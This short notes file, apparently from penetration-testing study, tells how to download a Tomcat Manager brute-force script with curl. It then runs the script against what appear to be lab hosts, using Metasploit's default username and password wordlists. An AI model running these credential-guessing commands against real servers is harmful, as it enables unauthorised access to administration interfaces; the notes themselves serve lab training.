---
aliases:
tags:
  - bruteforce
source:
  - https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce
desc:
---

# usage

- download and save `curl https://raw.githubusercontent.com/b33lz3bub-1/Tomcat-Manager-Bruteforce/refs/heads/master/mgr_brute.py -o mgr_brute.py`
- execute 
	- `python3 mgr_brute.py -u users.txt -p pass.txt -U http://10.10.10.194:8080/ -P host-manager/` 
	- `python3 mgr_brute.py -U http://web01.inlanefreight.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt`
	- 